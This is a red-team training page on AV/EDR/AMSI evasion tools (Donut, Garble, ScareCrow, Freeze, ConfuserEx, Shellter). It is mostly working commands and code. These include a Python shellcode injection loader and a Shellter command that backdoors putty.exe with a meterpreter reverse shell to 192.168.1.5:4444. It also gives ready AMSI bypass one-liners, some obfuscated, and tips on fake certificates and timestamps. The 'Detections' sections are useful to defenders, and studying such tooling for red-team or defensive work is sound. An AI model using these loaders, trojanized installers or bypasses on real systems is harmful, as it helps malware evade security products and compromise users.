---
layout: training-page
title: "Evasion & Obfuscation Tools — Red Team Academy"
module: "Red Team Tools"
tags:
  - evasion
  - obfuscation
  - av-bypass
  - shellcode
page_key: "tools-evasion"
render_with_liquid: false
---

# Evasion & Obfuscation Tools

Tools for bypassing AV, EDR, and AMSI. Covers shellcode generation/obfuscation, PE packing,
    .NET obfuscation, and payload staging. This is one of the fastest-moving areas of offensive tooling —
    detection signatures update constantly.

 DONUT 

## // Donut

Converts .NET assemblies, PE files, VBScript, and JScript into position-independent shellcode. The shellcode can be injected into any process. Essential for running tools like Rubeus or Seatbelt via custom shellcode injection loaders.

### Install

```
go install github.com/Binject/go-donut/cmd/donut@latest
# or pre-compiled binary from https://github.com/TheWover/donut/releases
```

### Common Usage

```
# Convert .NET EXE to shellcode
donut -f Rubeus.exe -o rubeus.bin

# With arguments baked in
donut -f Rubeus.exe -p "kerberoast /outfile:hashes.txt" -o rubeus-kerberoast.bin

# DLL to shellcode (export a specific function)
donut -f payload.dll -e DllMain -o payload.bin

# JScript/VBScript to shellcode
donut -f script.js -o script.bin

# Encrypt shellcode (XOR key)
donut -f Rubeus.exe -e 3 -o rubeus-enc.bin  # -e 3 = Maru hash encryption

# Generate as C array or PowerShell
donut -f Rubeus.exe -t 3 -o rubeus.ps1   # PowerShell
donut -f Rubeus.exe -t 2 -o rubeus.c     # C array

# 32-bit output
donut -f Rubeus.exe -a 1 -o rubeus32.bin
```

### Shellcode Injection Loaders (pair with Donut)

```
# Go-based loader template
# 1. Generate shellcode with Donut
donut -f Rubeus.exe -o sc.bin

# 2. Load and inject (example Go loader pattern)
# - Read shellcode
# - VirtualAlloc with RWX
# - Copy shellcode
# - CreateThread

# Python loader (testing only — not OPSEC safe)
import ctypes, sys
with open("sc.bin", "rb") as f:
    sc = f.read()
buf = ctypes.create_string_buffer(sc)
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(sc), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), buf, len(sc))
ctypes.windll.kernel32.CreateThread(None, 0, ctypes.c_void_p(ptr), None, 0, None)
```

### Detections

- Donut shellcode contains a recognizable header (Donut Instance) — YARA rules exist for it
- EDR: RWX memory allocation + shellcode injection pattern (VirtualAlloc → WriteProcessMemory → CreateThread)
- AMSI: Donut includes AMSI bypass code — caught by behavioral AMSI providers
- Memory scanning: EDRs scan allocated RWX regions for shellcode characteristics
- Mitigation: Use custom shellcode encryptors, avoid RWX (use RW→RX flip), use indirect syscalls for allocation

---

 GARBLE 

## // Garble

Build tool for obfuscating Go binaries. Strips debug symbols, randomizes identifiers, obfuscates string literals, and scrambles control flow. Drop-in replacement for 'go build'. Dramatically reduces AV detection rates for Go-based tools (Sliver, Ligolo, custom implants).

### Install

```
go install mvdan.cc/garble@latest
```

### Common Usage

```
# Basic obfuscated build (drop-in for go build)
garble build ./cmd/myimplant

# Obfuscate and strip everything
garble -literals -seed=random -tiny build -ldflags="-s -w" ./cmd/myimplant

# Build for Windows from Linux
GOOS=windows GOARCH=amd64 garble -literals -seed=random build -ldflags="-s -w -H=windowsgui" ./

# Cross-compile with CGO disabled (static binary)
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 garble -literals build ./

# Verify no strings remain (check output)
strings myimplant.exe | grep -i "http\|import\|golang"

# Use with goversioninfo to set fake PE metadata
go generate  # generates versioninfo
garble build .
```

### Garble Flags

| Flag | Effect |
| --- | --- |
| -literals | Obfuscate string literals (highest impact for AV) |
| -seed=random | Random seed each build (unique hash per compile) |
| -tiny | Remove all debug info, function names, file paths |
| -debugdir | Save obfuscated source for debugging |

### Detections

- Garbled binaries still have Go runtime characteristics (goroutine scheduler, GC headers)
- File entropy is higher in garbled binaries — entropy analysis can flag them
- Behavioral detection: runtime behavior (C2 callbacks, process injection) is unchanged
- Memory: strings obfuscated at rest but decrypted at runtime — memory scanning can still find them

---

 SCARECROW 

## // ScareCrow

Payload creation framework focused on EDR evasion. Creates shellcode loaders that bypass EDR by using syscalls, spoofing parent processes, thread stack spoofing, and loading into legitimate processes. Produces DLL, EXE, or XLL formats.

### Install

```
git clone https://github.com/Tylous/ScareCrow
cd ScareCrow && go build ScareCrow.go
```

### Common Usage

```
# Basic loader from raw shellcode
./ScareCrow -I shellcode.bin -Loader binary -domain microsoft.com

# DLL loader (hijacking scenario)
./ScareCrow -I shellcode.bin -Loader dll -domain microsoft.com -O payload.dll

# XLL (Excel add-in)
./ScareCrow -I shellcode.bin -Loader excel

# With fake signing certificate
./ScareCrow -I shellcode.bin -Loader binary -domain microsoft.com -nosign false

# ETW patching (bypass ETW logging)
./ScareCrow -I shellcode.bin -Loader binary -etw

# Process injection into specific target
./ScareCrow -I shellcode.bin -injection C:\\Windows\\System32\\notepad.exe

# Unhook EDR hooks (load fresh ntdll)
./ScareCrow -I shellcode.bin -Loader binary -unprotect
```

### Detections

- ScareCrow templates: YARA rules exist for known ScareCrow-generated code patterns
- Syscall usage: direct/indirect syscall patterns detectable by kernel-level EDR sensors
- Parent process spoofing: creates unusual PPID relationships — Sysmon Event 1 captures this
- ETW patch: modification of ntdll.dll in memory — detected by memory integrity checks
- Signature-based: fake certs don't pass chain validation (CRL/OCSP checked by SmartScreen)

---

 FREEZE 

## // Freeze

Payload generation tool for bypassing AV/EDR. Creates shellcode loaders using suspended processes, patched ntdll, and call stack spoofing. Simpler than ScareCrow but effective against many common EDRs.

### Install

```
git clone https://github.com/optiv/Freeze
cd Freeze && go build Freeze.go
```

### Common Usage

```
# Basic EXE from shellcode
./Freeze -I shellcode.bin -O payload.exe

# DLL
./Freeze -I shellcode.bin -O payload.dll

# Unhook ntdll (fresh copy from disk)
./Freeze -I shellcode.bin -unhook -O payload.exe

# Console vs GUI
./Freeze -I shellcode.bin -console -O payload.exe

# Fake compilation timestamp
./Freeze -I shellcode.bin -O payload.exe -timestamp 12/12/2019
```

---

 CONFUSEREX 

## // ConfuserEx

Open-source .NET obfuscator. Applies control flow obfuscation, string encryption, constant protection, anti-debug, and reference renaming to .NET assemblies. Used to reduce AV detection of C# tools like Rubeus, Seatbelt, and custom implants.

### Install

```
# Clone and build on Windows (.NET Framework required)
git clone https://github.com/mkaring/ConfuserEx
# Open in Visual Studio → Build
```

### Configuration (crproj file)

```
<?xml version="1.0" encoding="utf-8"?>
<project baseDir="C:\Tools" outputDir="C:\Tools\Confused" xmlns="http://confuser.codeplex.com">
  <rule pattern="true" preset="maximum" inherit="false">
    <protection id="anti debug" />
    <protection id="anti dump" />
    <protection id="anti tamper" />
    <protection id="constants" />
    <protection id="ctrl flow" />
    <protection id="invalid metadata" />
    <protection id="ref proxy" />
    <protection id="rename" />
    <protection id="resources" />
  </rule>
  <module path="Rubeus.exe" />
</project>
```

```
# Run from CLI
ConfuserEx.CLI.exe -n rubeus.crproj
```

### Detections

- ConfuserEx generates recognizable patterns — AV vendors have ConfuserEx signatures
- AMSI: behavioral detection catches obfuscated assemblies when loaded into memory
- Anti-tamper protection modifies PE structure — some AV heuristics flag this
- Better alternatives: combine with custom string encryption or use Eazfuscator for more unique output

---

 SHELLTER 

## // Shellter

PE injector — injects shellcode into legitimate Windows PE files (e.g., PuTTY.exe, 7-zip installer). Uses dynamic analysis to find hijacking points. Produces convincingly legitimate-looking files that execute payload when run.

### Install

```
sudo apt install shellter
# or download Pro version from https://www.shellterproject.com/
```

### Common Usage

```
# Interactive mode
shellter

# Automated mode
shellter -f putty.exe -a -p windows/meterpreter/reverse_tcp -u -lhost 192.168.1.5 -lport 4444

# Flags:
# -f: target PE file (32-bit PE)
# -a: auto mode
# -p: payload (msfvenom format or raw shellcode file)
# -u: stealth mode (preserve original functionality)
# --polymorph: polymorphic obfuscation
```

### Detections

- PE modification: hash mismatch vs known-good binary (file integrity monitoring catches this)
- Code cave injection patterns — YARA rules for shellcode injection artifacts
- Behavioral: legitimate PuTTY spawning cmd.exe or making unexpected network connections
- SmartScreen/reputation: modified PE loses Authenticode signature validation

---

 GENERAL AMSI BYPASS 

## // AMSI Bypass Tooling

Antimalware Scan Interface (AMSI) is a Windows API that allows AV/EDR to scan PowerShell, .NET, and other scripted content at runtime. Bypassing AMSI is required before loading offensive PowerShell or .NET tools in-memory.

### In-Memory Patch (PowerShell)

```
# Classic AMSI patch (well-detected — educational only)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Obfuscated variant (rotate characters to avoid static detection)
$a = 'System.Management.Automation.A';$b = 'msiUtils';$c = [Ref].Assembly.GetType($a+$b)
$d = $c.GetField('amsiInitFailed','NonPublic,Static');$d.SetValue($null,$true)

# Matt Graeber's original (many detections)
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41424344)
```

### AMSI.fail

```
# AMSI.fail generates obfuscated bypass one-liners
# https://amsi.fail — generates new bypass each visit

# Example output (varies):
$w = 'System.Manag';$ement = 'ement.Automat';$ion = 'ion.AmsiUtils'
$a = [Ref].Assembly.GetType($w+$ement+$ion)
# ... obfuscated patch continues
```

### Hardware Breakpoint AMSI Bypass

```
# Set hardware breakpoint on AmsiScanBuffer to intercept and patch return value
# More advanced — not detected by many AMSI providers
# Tools: SharpBlock, TamperingSyscalls

# Evil-WinRM built-in
Bypass-4MSI  # automatically applied when using evil-winrm
```

### Detections

- PowerShell ScriptBlock logging (Event 4104) captures bypass code even when AMSI is bypassed
- EDR memory scanning: modification of amsi.dll in process memory
- AMSI providers: CrowdStrike, Defender, SentinelOne have signatures for known bypass patterns
- Behavioral: the act of patching AMSI is itself suspicious behavior detected by EDR
- ETW: AMSI_SCAN_BUFFER event (Microsoft-Antimalware-Scan-Interface) logs bypass attempts

**Note:** AMSI bypass techniques have a very short shelf life. Use fresh techniques from amsi.fail, combine with PS downgrade (powershell.exe -version 2) where .NET 2.0 is available, or use execute-assembly to run .NET without PowerShell.
